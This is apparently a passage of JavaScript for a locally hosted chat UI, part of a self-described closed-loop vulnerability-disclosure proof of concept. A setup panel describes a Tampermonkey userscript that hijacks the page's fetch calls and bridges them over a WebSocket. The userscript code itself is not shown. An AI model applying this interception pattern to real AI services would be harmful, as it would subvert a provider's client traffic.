      CommandPalette._selected = Math.min(CommandPalette._filtered.length - 1, CommandPalette._selected + 1);
      CommandPalette.renderList();
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      CommandPalette._selected = Math.max(0, CommandPalette._selected - 1);
      CommandPalette.renderList();
    } else if (e.key === 'Enter') {
      const cmd = CommandPalette._filtered[CommandPalette._selected];
      if (cmd) { CommandPalette.close(); cmd.fn(); }
    } else if (e.key === 'Escape') {
      CommandPalette.close();
    }
  },

  showShortcuts() {
    const shortcuts = [
      ['Ctrl+K',           'Command palette'],
      ['Ctrl+Shift+O',     'New conversation'],
      ['Ctrl+,',           'Settings'],
      ['Ctrl+E',           'Export current conversation'],
      ['Ctrl+Shift+M',     'Memory panel'],
      ['Ctrl+Shift+P',     'Projects panel'],
      ['Ctrl+Shift+U',     'Usage analytics'],
      ['Ctrl+Shift+B',     'Backup all data'],
      ['Ctrl+/',           'Focus input'],
      ['Enter',            'Send message'],
      ['Shift+Enter',      'New line in input'],
      ['Escape',           'Close panel / stop stream'],
      ['F1',               'Quick help'],
    ];

    let modal = document.getElementById('shortcuts-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'shortcuts-modal';
      modal.className = 'modal-overlay';
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
      document.body.appendChild(modal);
    }

    modal.innerHTML = \`<div class="modal" style="max-width:460px">
      <div class="modal-header">
        <span class="modal-title">⌨ Keyboard shortcuts</span>
        <button class="btn-icon" onclick="document.getElementById('shortcuts-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <table style="width:100%;border-collapse:collapse;">
          \${shortcuts.map(([key, desc]) =>
            \`<tr><td style="padding:5px 0;"><code style="font-family:var(--font-mono);font-size:11px;background:var(--surface3);padding:2px 6px;border-radius:2px;">\${key}</code></td>
             <td style="padding:5px 0 5px 12px;font-size:12px;color:var(--text2)">\${desc}</td></tr>\`
          ).join('')}
        </table>
      </div>
    </div>\`;
    modal.classList.add('open');
  },
};

// Override Ctrl+K to open command palette
Shortcuts.register('ctrl+k', (e) => CommandPalette.open());

(function injectCmdPaletteCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .cmd-palette-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:900;display:none;align-items:flex-start;justify-content:center;padding-top:120px;}
    .cmd-palette-overlay[style*="display: "]{display:flex!important;}
    .cmd-palette{background:var(--surface);border:1px solid var(--border2);border-radius:8px;width:560px;max-height:400px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,.6);display:flex;flex-direction:column;}
    .cmd-input-wrap{display:flex;align-items:center;gap:8px;padding:12px 16px;border-bottom:1px solid var(--border);}
    .cmd-icon{font-size:16px;color:var(--text3);}
    .cmd-input{flex:1;background:none;border:none;color:var(--text);font-size:15px;font-family:inherit;outline:none;}
    .cmd-input::placeholder{color:var(--text3);}
    .cmd-list{overflow-y:auto;padding:6px;}
    .cmd-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:var(--radius);cursor:pointer;}
    .cmd-item:hover,.cmd-item.selected{background:var(--surface3);}
    .cmd-item-icon{font-size:15px;width:24px;text-align:center;flex-shrink:0;}
    .cmd-item-text{display:flex;flex-direction:column;min-width:0;}
    .cmd-item-label{font-size:13px;font-weight:600;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
    .cmd-item-desc{font-size:11px;color:var(--text2);}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// DRAFT MANAGEMENT
// ================================================================

const DraftManager = {
  _currentDraftId: null,
  _autoSaveTimer:  null,

  // Auto-save input as draft every 3 seconds
  startAutoSave(convId) {
    DraftManager._autoSaveTimer = setInterval(() => {
      const text = document.getElementById('msg-input')?.value || '';
      if (text.trim()) {
        DraftManager.saveDraft(convId, text);
      }
    }, 3000);
  },

  stopAutoSave() {
    if (DraftManager._autoSaveTimer) {
      clearInterval(DraftManager._autoSaveTimer);
      DraftManager._autoSaveTimer = null;
    }
  },

  async saveDraft(convId, text) {
    try {
      if (DraftManager._currentDraftId) {
        await API._fetch('/drafts/' + DraftManager._currentDraftId, {
          method: 'PATCH',
          body: JSON.stringify({ content: text, conversation_uuid: convId }),
        });
      } else {
        const draft = await API._json('/drafts', {
          method: 'POST',
          body:   JSON.stringify({ content: text, conversation_uuid: convId }),
        });
        DraftManager._currentDraftId = draft.uuid;
      }
    } catch {}
  },

  async loadDraftForConv(convId) {
    try {
      const data   = await API._json('/drafts');
      const drafts = data.drafts || [];
      const draft  = drafts.find(d => d.conversation_uuid === convId);
      if (draft) {
        DraftManager._currentDraftId = draft.uuid;
        const input = document.getElementById('msg-input');
        if (input && !input.value) {
          input.value = draft.content;
          App.autoResizeInput();
          Toast.info('Draft restored');
        }
      }
    } catch {}
  },

  async discardCurrent() {
    if (!DraftManager._currentDraftId) return;
    try {
      await API._fetch('/drafts/' + DraftManager._currentDraftId, { method: 'DELETE' });
      DraftManager._currentDraftId = null;
    } catch {}
  },
};

// ================================================================
// TAG MANAGEMENT UI
// ================================================================

const TagUI = {
  open(convId) {
    let modal = document.getElementById('tag-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'tag-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal">
      <div class="modal-header">
        <span class="modal-title">🏷 Tags for this conversation</span>
        <button class="btn-icon" onclick="document.getElementById('tag-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div id="tag-list-inner">Loading…</div>
        <div style="margin-top:12px;display:flex;gap:8px;">
          <input id="new-tag-input" placeholder="New tag…" style="flex:1">
          <button class="btn btn-accent btn-sm" onclick="TagUI.addTag('\${convId}')">Add</button>
        </div>
      </div>
    </div>\`;

    modal.classList.add('open');

    API._json('/api/organizations/ORG/chat_conversations/' + convId + '/tags')
      .then(data => {
        const inner = document.getElementById('tag-list-inner');
        if (!inner) return;
        const tags = data.tags || [];
        inner.innerHTML = tags.length
          ? tags.map(t => \`<span class="tag-chip" style="margin:2px">\${ConvList.esc(t)} <button class="btn-icon" onclick="TagUI.removeTag('\${convId}','\${t}')" style="width:14px;height:14px;font-size:9px">✕</button></span>\`).join('')
          : '<div class="dim" style="font-size:12px">No tags yet</div>';
      }).catch(() => {});

    setTimeout(() => document.getElementById('new-tag-input')?.focus(), 100);
  },

  async addTag(convId) {
    const input = document.getElementById('new-tag-input');
    const tag   = input?.value.trim();
    if (!tag) return;
    try {
      await API._json('/api/organizations/ORG/chat_conversations/' + convId + '/tags', {
        method: 'POST', body: JSON.stringify({ tag }),
      });
      if (input) input.value = '';
      TagUI.open(convId);
      Toast.ok('Tag added');
    } catch (e) {
      Toast.err('Failed: ' + e.message);
    }
  },

  async removeTag(convId, tag) {
    try {
      await API._fetch('/api/organizations/ORG/chat_conversations/' + convId + '/tags/' + encodeURIComponent(tag), { method: 'DELETE' });
      TagUI.open(convId);
    } catch {}
  },
};

// ================================================================
// MODEL INFO PANEL
// ================================================================

const ModelInfo = {
  open(modelId) {
    const model = MODELS.find(m => m.id === modelId) || { id: modelId, name: modelId, tier: '?' };

    const caps = {
      'claude-opus-4-6':          { ctx: '200K', max_out: '32K', thinking: true,  vision: true, tools: true },
      'claude-sonnet-4-6':        { ctx: '200K', max_out: '16K', thinking: false, vision: true, tools: true },
      'claude-haiku-4-5-20251001':{ ctx: '200K', max_out: '8K',  thinking: false, vision: true, tools: true },
    };
    const c = caps[modelId] || { ctx: '200K', max_out: '8K', thinking: false, vision: true, tools: true };

    let modal = document.getElementById('model-info-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'model-info-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:400px">
      <div class="modal-header">
        <span class="modal-title">🤖 \${ConvList.esc(model.name)}</span>
        <button class="btn-icon" onclick="document.getElementById('model-info-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="model-info-grid">
          <div class="model-info-item"><span class="model-info-key">ID</span><span class="model-info-val mono">\${ConvList.esc(modelId)}</span></div>
          <div class="model-info-item"><span class="model-info-key">Context window</span><span class="model-info-val">\${c.ctx} tokens</span></div>
          <div class="model-info-item"><span class="model-info-key">Max output</span><span class="model-info-val">\${c.max_out} tokens</span></div>
          <div class="model-info-item"><span class="model-info-key">Tier required</span><span class="model-info-val">\${model.tier.toUpperCase()}</span></div>
          <div class="model-info-item"><span class="model-info-key">Extended thinking</span><span class="model-info-val">\${c.thinking ? '✓ Yes' : '✗ No'}</span></div>
          <div class="model-info-item"><span class="model-info-key">Vision</span><span class="model-info-val">\${c.vision ? '✓ Yes' : '✗ No'}</span></div>
          <div class="model-info-item"><span class="model-info-key">Tool use</span><span class="model-info-val">\${c.tools ? '✓ Yes' : '✗ No'}</span></div>
        </div>
        <button class="btn btn-accent" style="width:100%;justify-content:center;margin-top:14px;" onclick="document.getElementById('model-select').value='\${modelId}';State.config.model='\${modelId}';document.getElementById('model-info-modal').classList.remove('open');Toast.ok('Model set to \${model.name}')">Use this model</button>
      </div>
    </div>\`;

    modal.classList.add('open');
  },
};

(function injectModelInfoCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .model-info-grid{display:flex;flex-direction:column;gap:8px;}
    .model-info-item{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid var(--border);}
    .model-info-key{font-size:12px;color:var(--text2);}
    .model-info-val{font-size:12px;color:var(--text);font-weight:600;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// CONVERSATION STATS
// ================================================================

const ConvStats = {
  compute(conv) {
    if (!conv || !conv.messages?.length) return null;
    const msgs     = conv.messages;
    const human    = msgs.filter(m => m.role === 'user');
    const asst     = msgs.filter(m => m.role === 'assistant');
    const allText  = msgs.map(m => Chat.getMessageText(m)).join(' ');
    const wordCount = allText.split(/\\s+/).filter(Boolean).length;
    const estTokens = Math.ceil(allText.length / 4);
    const firstMsg  = new Date(msgs[0]?.created_at || Date.now());
    const lastMsg   = new Date(msgs[msgs.length - 1]?.created_at || Date.now());
    const durationMs = lastMsg - firstMsg;
    const durationStr = durationMs < 60000 ? Math.floor(durationMs / 1000) + 's'
      : durationMs < 3600000 ? Math.floor(durationMs / 60000) + 'm'
      : Math.floor(durationMs / 3600000) + 'h';

    return {
      total_messages: msgs.length,
      human_messages: human.length,
      assistant_messages: asst.length,
      word_count:     wordCount,
      est_tokens:     estTokens,
      duration:       durationStr,
      avg_msg_length: Math.ceil(wordCount / msgs.length),
    };
  },

  show(convId) {
    const conv  = State.conversations.get(convId);
    const stats = ConvStats.compute(conv);
    if (!stats) { Toast.info('No messages to analyze'); return; }

    let modal = document.getElementById('stats-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'stats-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:380px">
      <div class="modal-header">
        <span class="modal-title">📊 Conversation stats</span>
        <button class="btn-icon" onclick="document.getElementById('stats-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="model-info-grid">
          \${Object.entries(stats).map(([k, v]) =>
            \`<div class="model-info-item"><span class="model-info-key">\${k.replace(/_/g,' ')}</span><span class="model-info-val">\${v}</span></div>\`
          ).join('')}
        </div>
      </div>
    </div>\`;
    modal.classList.add('open');
  },
};

// ================================================================
// INLINE STATUS BAR — replaces the boring bottom hint with live info
// ================================================================

(function initStatusBar() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initStatusBar);
    return;
  }
  const hint = document.getElementById('input-hint');
  if (!hint) return;

  function update() {
    const conv = State.conversations.get(State.currentConvId);
    const msgs = conv?.messages?.length || 0;
    const streaming = State.isStreaming ? ' · streaming…' : '';
    hint.textContent = msgs
      ? \`\${msgs} messages\${streaming} · Enter to send · Shift+Enter newline · Ctrl+K commands\`
      : 'Enter to send · Shift+Enter for newline · Ctrl+K for commands';
  }

  setInterval(update, 2000);
  update();
})();

// ================================================================
// QUICK ACTION CREATOR (add new quick actions)
// ================================================================

const QuickActionCreator = {
  open() {
    let modal = document.getElementById('qa-creator-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'qa-creator-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal">
      <div class="modal-header">
        <span class="modal-title">⚡ Create quick action</span>
        <button class="btn-icon" onclick="document.getElementById('qa-creator-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="settings-field"><label>Name</label><input id="qa-name" placeholder="My action" style="width:100%"></div>
        <div class="settings-row">
          <div class="settings-field"><label>Icon (emoji)</label><input id="qa-icon" placeholder="⚡" style="width:100%" maxlength="2"></div>
          <div class="settings-field"><label>Model (blank = default)</label><select id="qa-model" style="width:100%">
            <option value="">Default</option>
            \${MODELS.map(m => \`<option value="\${m.id}">\${m.name}</option>\`).join('')}
          </select></div>
        </div>
        <div class="settings-field"><label>Prompt template</label><textarea id="qa-prompt" style="width:100%;min-height:100px" placeholder="Enter the prompt. The user's input will be appended after this."></textarea></div>
        <div class="settings-row">
          <div class="settings-field"><label><input type="checkbox" id="qa-pinned" style="width:auto;margin-right:6px">Pin to quick actions</label></div>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-ghost" onclick="document.getElementById('qa-creator-modal').classList.remove('open')">Cancel</button>
        <button class="btn btn-accent" onclick="QuickActionCreator.save()">Create</button>
      </div>
    </div>\`;

    modal.classList.add('open');
    setTimeout(() => document.getElementById('qa-name')?.focus(), 100);
  },

  async save() {
    const name   = document.getElementById('qa-name')?.value.trim();
    const icon   = document.getElementById('qa-icon')?.value.trim() || '⚡';
    const model  = document.getElementById('qa-model')?.value;
    const prompt = document.getElementById('qa-prompt')?.value.trim();
    const pinned = document.getElementById('qa-pinned')?.checked;

    if (!name || !prompt) { Toast.warn('Name and prompt are required'); return; }

    try {
      const qa = await API._json('/quick_actions', {
        method: 'POST',
        body:   JSON.stringify({ name, icon, prompt, model: model || undefined, pinned }),
      });
      State.quickActions.push(qa);
      App._renderQuickActions();
      document.getElementById('qa-creator-modal').classList.remove('open');
      Toast.ok('Quick action created: ' + name);
    } catch (e) {
      Toast.err('Failed: ' + e.message);
    }
  },
};

// ================================================================
// THEME SWITCHER
// ================================================================

const Theme = {
  _themes: {
    amber: {
      '--bg': '#0c0c10',       '--surface': '#13131a',    '--surface2': '#1a1a24',
      '--surface3': '#21212e', '--border': '#2c2c3e',    '--border2': '#383850',
      '--accent': '#e8903a',   '--accent-dim': 'rgba(232,144,58,.12)',
      '--blue': '#5d9de0',     '--green': '#58b87a',      '--red': '#e05050',
    },
    blue: {
      '--bg': '#0d1117',       '--surface': '#161b22',    '--surface2': '#21262d',
      '--surface3': '#2d333b', '--border': '#30363d',    '--border2': '#444c56',
      '--accent': '#58a6ff',   '--accent-dim': 'rgba(88,166,255,.12)',
      '--blue': '#79c0ff',     '--green': '#56d364',      '--red': '#ff7b72',
    },
    green: {
      '--bg': '#0d1210',       '--surface': '#131a16',    '--surface2': '#1a241e',
      '--surface3': '#202e26', '--border': '#2c3e34',    '--border2': '#38503e',
      '--accent': '#58b87a',   '--accent-dim': 'rgba(88,184,122,.12)',
      '--blue': '#7ab8e8',     '--green': '#a0e8b0',      '--red': '#e06060',
    },
  },

  set(name) {
    const t = Theme._themes[name];
    if (!t) return;
    for (const [prop, val] of Object.entries(t)) {
      document.documentElement.style.setProperty(prop, val);
    }
    localStorage.setItem('wb_theme', name);
    Toast.info('Theme: ' + name);
  },

  restore() {
    const saved = localStorage.getItem('wb_theme');
    if (saved && Theme._themes[saved]) Theme.set(saved);
  },
};

// ================================================================
// APP PATCHES — wire up remaining functionality
// ================================================================

// Override App.openSearch to use CommandPalette if no query entered quickly
const _origOpenSearch = App.openSearch.bind(App);
App.openSearch = function() {
  CommandPalette.open();
};

// Patch App.loadConversation to load drafts
const _origLoadConv = App.loadConversation.bind(App);
App.loadConversation = async function(id) {
  DraftManager.stopAutoSave();
  await _origLoadConv(id);
  DraftManager.loadDraftForConv(id);
  DraftManager.startAutoSave(id);
};

// Patch App.newConversation to save draft first
const _origNewConv = App.newConversation.bind(App);
App.newConversation = function() {
  DraftManager.stopAutoSave();
  DraftManager._currentDraftId = null;
  _origNewConv();
};

// Patch App.send to discard draft on send
const _origSend = App.send.bind(App);
App.send = async function() {
  await _origSend();
  DraftManager.discardCurrent();
};

// Add context menu items to conv list
const _origConvCtx = ConvList.ctxMenu.bind(ConvList);
ConvList.ctxMenu = function(e, id) {
  e.preventDefault();
  const conv = State.conversations.get(id);
  CtxMenu.open(e.clientX, e.clientY, [
    { label: 'Open',             icon: '↗', action: 'open',   handler: () => App.loadConversation(id) },
    { label: 'Rename',           icon: '✎', action: 'rename', handler: () => ConvList.rename(id) },
    { label: conv?.starred ? 'Unstar' : 'Star', icon: '★', action: 'star', handler: () => ConvList.star(id) },
    { label: 'Manage tags',      icon: '🏷', action: 'tags',  handler: () => TagUI.open(id) },
    { label: 'Conversation stats',icon:'📊', action: 'stats', handler: () => ConvStats.show(id) },
    '-',
    { label: 'Export JSON',      icon: '⬇', action: 'expj',  handler: () => window.open(API.exportConvUrl(id, 'json')) },
    { label: 'Export Markdown',  icon: '⬇', action: 'expmd', handler: () => window.open(API.exportConvUrl(id, 'markdown')) },
    '-',
    { label: 'Delete',           icon: '🗑', action: 'del',  handler: () => ConvList.del(id), danger: true },
  ]);
};

// Add model info button to model select
(function addModelInfoBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addModelInfoBtn);
    return;
  }
  const toolbar = document.querySelector('.input-toolbar');
  if (!toolbar) return;
  const infoBtn = document.createElement('button');
  infoBtn.className = 'btn-icon';
  infoBtn.title     = 'Model info';
  infoBtn.textContent = 'ℹ';
  infoBtn.onclick   = () => {
    const model = document.getElementById('model-select')?.value || State.config.model;
    ModelInfo.open(model);
  };
  const modelSel = toolbar.querySelector('.model-select-compact');
  if (modelSel) modelSel.after(infoBtn);
})();

// Add "Create quick action" button to empty state
(function addCreateQAButton() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addCreateQAButton);
    return;
  }
  const qaGrid = document.getElementById('qa-grid');
  if (!qaGrid) return;
  const createBtn = document.createElement('button');
  createBtn.className = 'qa-btn';
  createBtn.innerHTML = '<span>✚</span>Create action';
  createBtn.onclick   = () => QuickActionCreator.open();
  qaGrid.appendChild(createBtn);
})();

// Theme restore on load
(function() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => Theme.restore());
  } else {
    Theme.restore();
  }
})();

// ================================================================
// CODE BLOCK ACTION BUTTONS — copy + language badge on every <pre>
// ================================================================

const CodeBlocks = {
  // Called after markdown rendering to inject copy buttons
  enhance(container) {
    container.querySelectorAll('pre:not(.enhanced)').forEach(pre => {
      pre.classList.add('enhanced');
      pre.style.position = 'relative';

      const code  = pre.querySelector('code');
      const lang  = [...(code?.classList || [])].find(c => c.startsWith('lang-'))?.slice(5) || 'code';
      const text  = code?.textContent || pre.textContent || '';

      // Language badge
      const badge = document.createElement('span');
      badge.style.cssText = 'position:absolute;top:6px;left:10px;font-size:9px;font-family:var(--font-mono);color:var(--text3);letter-spacing:.06em;text-transform:uppercase;';
      badge.textContent = lang;

      // Copy button
      const copyBtn = document.createElement('button');
      copyBtn.style.cssText = 'position:absolute;top:4px;right:6px;background:var(--surface);border:1px solid var(--border);color:var(--text2);padding:3px 8px;border-radius:2px;font-size:10px;font-family:var(--font-mono);cursor:pointer;transition:all .15s;';
      copyBtn.textContent = '⎘ copy';
      copyBtn.onclick = () => {
        navigator.clipboard.writeText(text).then(() => {
          copyBtn.textContent = '✓ copied';
          copyBtn.style.color = 'var(--green)';
          setTimeout(() => { copyBtn.textContent = '⎘ copy'; copyBtn.style.color = ''; }, 1500);
        }).catch(() => Toast.err('Copy failed'));
      };

      // Wrap text in code if not already
      if (code) code.style.paddingTop = '22px';
      pre.insertBefore(badge, pre.firstChild);
      pre.appendChild(copyBtn);
    });
  },
};

// Patch Chat.renderAll to enhance code blocks
const _prevRenderAll = Chat.renderAll.bind(Chat);
Chat.renderAll = function(conv) {
  _prevRenderAll(conv);
  const msgs = document.getElementById('messages');
  if (msgs) {
    setTimeout(() => { CodeBlocks.enhance(msgs); Syntax.highlight(msgs); }, 60);
  }
};

// Also enhance blocks added during streaming
const _codeBlockObserver = new MutationObserver(mutations => {
  const msgs = document.getElementById('messages');
  if (msgs) CodeBlocks.enhance(msgs);
});

document.addEventListener('DOMContentLoaded', () => {
  const msgs = document.getElementById('messages');
  if (msgs) _codeBlockObserver.observe(msgs, { childList: true, subtree: true });
});

// ================================================================
// IMAGE DISPLAY — inline image attachments in messages
// ================================================================

const ImageDisplay = {
  // Render image attachment content blocks inline
  renderImageBlock(src, alt, isBase64) {
    const img = document.createElement('img');
    img.style.cssText = 'max-width:100%;max-height:400px;border-radius:3px;border:1px solid var(--border);cursor:pointer;display:block;margin:8px 0;';
    img.alt   = alt || 'Attached image';
    img.title = 'Click to open full size';
    img.onclick = () => {
      const w = window.open('', '_blank');
      w.document.write(\`<img src="\${src}" style="max-width:100%;display:block;margin:auto;">\`);
      w.document.close();
    };

    // Lazy load
    if ('IntersectionObserver' in window) {
      img.dataset.src = src;
      img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><text y="20" font-size="20">🖼</text></svg>';
      const obs = new IntersectionObserver(entries => {
        for (const e of entries) {
          if (e.isIntersecting) {
            e.target.src = e.target.dataset.src;
            obs.unobserve(e.target);
          }
        }
      });
      obs.observe(img);
    } else {
      img.src = src;
    }

    return img;
  },
};

// ================================================================
// WORKER C SETUP PANEL — explains how to connect Worker C
// ================================================================

const WorkerCPanel = {
  open() {
    let modal = document.getElementById('worker-c-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'worker-c-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    const wsUrl = State.workerAUrl.replace('http://', 'ws://').replace('https://', 'wss://') + '/ws';

    modal.innerHTML = \`<div class="modal" style="max-width:560px">
      <div class="modal-header">
        <span class="modal-title">🔌 Connect Worker C (Tampermonkey)</span>
        <button class="btn-icon" onclick="document.getElementById('worker-c-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <p style="font-size:13px;color:var(--text2);margin-bottom:12px;line-height:1.6">
          Worker C is the Tampermonkey userscript that demonstrates the fetch-hijack pattern
          in a <strong style="color:var(--accent)">closed loop on this page</strong>.
          It intercepts Worker B's fetch calls and bridges them through Worker A's WebSocket,
          proving the architectural pattern without touching any real Anthropic infrastructure.
        </p>
        <div class="wc-step">
          <div class="wc-step-num">1</div>
          <div class="wc-step-body">
            <div class="wc-step-title">Install Tampermonkey</div>
            <div class="wc-step-desc">Install the Tampermonkey extension from your browser's extension store.</div>
          </div>
        </div>
        <div class="wc-step">
          <div class="wc-step-num">2</div>
          <div class="wc-step-body">
            <div class="wc-step-title">Create a new userscript</div>
            <div class="wc-step-desc">In Tampermonkey, click Dashboard → New script.</div>
          </div>
        </div>
        <div class="wc-step">
          <div class="wc-step-num">3</div>
          <div class="wc-step-body">
            <div class="wc-step-title">Set match pattern (LOCAL ONLY)</div>
            <div class="wc-step-desc">
              The <code style="font-family:var(--font-mono);background:var(--surface3);padding:1px 4px;border-radius:2px">@match</code> must target only this page, never real claude.ai:
              <pre style="background:var(--surface3);border:1px solid var(--border);padding:8px;font-family:var(--font-mono);font-size:11px;margin-top:6px;border-radius:3px">// @match  http://127.0.0.1:*/*
// @match  http://localhost:*/*</pre>
            </div>
          </div>
        </div>
        <div class="wc-step">
          <div class="wc-step-num">4</div>
          <div class="wc-step-body">
            <div class="wc-step-title">Worker A WebSocket endpoint</div>
            <div class="wc-step-desc">
              Worker C bridges to:<br>
              <code style="font-family:var(--font-mono);color:var(--accent);word-break:break-all">\${wsUrl}</code>
            </div>
          </div>
        </div>
        <div class="wc-step">
          <div class="wc-step-num">5</div>
          <div class="wc-step-body">
            <div class="wc-step-title">Current WS status</div>
            <div id="wc-ws-status" class="wc-step-desc">Checking…</div>
          </div>
        </div>
        <div style="margin-top:14px;padding:10px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:3px;font-size:11px;color:var(--accent)">
          ⚠ VDP research artifact only. Worker C is strictly for the closed-loop demonstration.
          The @match pattern above ensures it only runs on localhost, never on real Anthropic infrastructure.
        </div>
      </div>
    </div>\`;

    modal.classList.add('open');

    // Check WS status
    API._json('/diag').then(d => {
      const el = document.getElementById('wc-ws-status');
      if (el) {
        const connected = d.active_ws;
        el.innerHTML = connected
          ? '<span style="color:var(--green)">✓ Worker C connected (' + (d.ws_clients || 1) + ' client)</span>'
          : '<span style="color:var(--text3)">No Worker C connection. Install userscript and open this page.</span>';
      }
    }).catch(() => {});
  },
};

(function injectWorkerCCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .wc-step{display:flex;gap:10px;margin-bottom:12px;}
    .wc-step-num{width:22px;height:22px;background:var(--accent);color:#0c0c10;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:1px;}
    .wc-step-title{font-size:13px;font-weight:700;margin-bottom:3px;}
    .wc-step-desc{font-size:12px;color:var(--text2);line-height:1.6;}
  \`;
  document.head.appendChild(s);
})();

// Add Worker C button to topbar
(function addWorkerCBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addWorkerCBtn);
    return;
  }
  // We already have the wc-status-pill — make it clickable
  const wcPill = document.getElementById('wc-status-pill');
  if (wcPill) {
    wcPill.style.cursor = 'pointer';
    wcPill.title        = 'Worker C setup / status';
    wcPill.onclick      = () => WorkerCPanel.open();
  }
})();

// ================================================================
// RATE LIMIT DISPLAY
// ================================================================

const RateLimitDisplay = {
  _data: null,

  async load() {
    try {
      const data = await API._json('/v1/rate_limits');
      RateLimitDisplay._data = data;
      RateLimitDisplay.render();
    } catch {}
  },

  render() {
    const d = RateLimitDisplay._data;
    if (!d) return;

    let panel = document.getElementById('rl-panel');
    if (!panel) return;

    const used   = d.tokens_input?.used || 0;
    const limit  = d.tokens_input?.limit || 1000000;
    const pct    = Math.min(100, Math.round(used / limit * 100));
    const reset  = d.tokens_input?.reset_at ? new Date(d.tokens_input.reset_at).toLocaleTimeString() : '—';

    panel.innerHTML = \`<div style="font-size:11px;color:var(--text2);font-family:var(--font-mono);margin-bottom:8px">Rate limits (Worker A mock)</div>
      <div style="display:flex;flex-direction:column;gap:6px">
        \${['requests', 'tokens_input', 'tokens_output'].filter(k => d[k]).map(k => {
          const item = d[k];
          const p    = Math.min(100, Math.round((item.used || 0) / (item.limit || 1) * 100));
          return \`<div>
            <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text2);margin-bottom:2px;font-family:var(--font-mono)">
              <span>\${k}</span><span>\${item.used || 0}/\${item.limit || '∞'}</span>
            </div>
            <div style="height:3px;background:var(--surface3);border-radius:1px;overflow:hidden">
              <div style="height:100%;width:\${p}%;background:\${p > 80 ? 'var(--red)' : p > 50 ? 'var(--accent)' : 'var(--green)'};transition:width .3s"></div>
            </div>
          </div>\`;
        }).join('')}
      </div>
      <div style="font-size:10px;color:var(--text3);margin-top:8px;font-family:var(--font-mono)">Resets: \${reset}</div>\`;
  },
};

// ================================================================
// COMPREHENSIVE HELP PANEL
// ================================================================

const Help = {
  open() {
    let modal = document.getElementById('help-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'help-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:620px;max-height:80vh;overflow-y:auto">
      <div class="modal-header" style="position:sticky;top:0;background:var(--surface)">
        <span class="modal-title">// Worker B — Help</span>
        <button class="btn-icon" onclick="document.getElementById('help-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div style="font-family:var(--font-mono);font-size:12px;color:var(--accent);margin-bottom:16px;padding:10px;background:var(--accent-dim);border-radius:3px;line-height:1.7">
          Worker B is the chat UI for the Sister PoC closed-loop security research project.
          All requests go to Worker A (localhost:8787). Worker A routes to your configured backend (LM Studio, OpenRouter, etc.) and enforces BLOCKED_HOSTS.
        </div>

        <div class="help-section">
          <div class="help-section-title">Architecture</div>
          <div class="help-diagram">
            <div class="help-diagram-row">
              <span class="help-node wb">Worker B (this page)</span>
              <span class="help-arrow">→ fetch</span>
              <span class="help-node wa">Worker A :8787</span>
              <span class="help-arrow">→ proxy</span>
              <span class="help-node be">Your Backend</span>
            </div>
            <div class="help-diagram-row" style="margin-top:6px;font-size:10px;color:var(--text3)">
              <span style="flex:1">Chat UI + artifacts</span>
              <span style="flex:1">HTTP+WS mock server</span>
              <span style="flex:1">LM Studio / OpenRouter</span>
            </div>
            <div class="help-diagram-row" style="margin-top:12px;">
              <span class="help-node wc">Worker C (userscript)</span>
              <span class="help-arrow">↑ intercepts fetch on this page</span>
              <span style="flex:2"></span>
            </div>
          </div>
        </div>

        <div class="help-section">
          <div class="help-section-title">Four backend modes</div>
          <div class="help-table">
